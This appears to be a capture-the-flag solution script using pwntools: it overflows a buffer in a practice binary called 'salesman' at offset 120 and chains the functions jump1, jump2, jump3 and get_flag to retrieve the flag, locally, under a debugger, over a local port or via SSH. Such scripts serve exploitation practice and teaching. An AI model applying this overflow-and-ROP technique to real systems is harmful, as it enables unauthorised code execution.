#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/salesman'

e = ELF('./build/salesman')
rop = ROP('./build/salesman')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5501)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/salesman', cwd='problemDir')
else:
    p = e.process()

payload = flat({120: e.sym['jump1']},e.sym['jump2'],e.sym['jump3'],e.sym['get_flag'])

p.sendline(payload)
p.interactive()
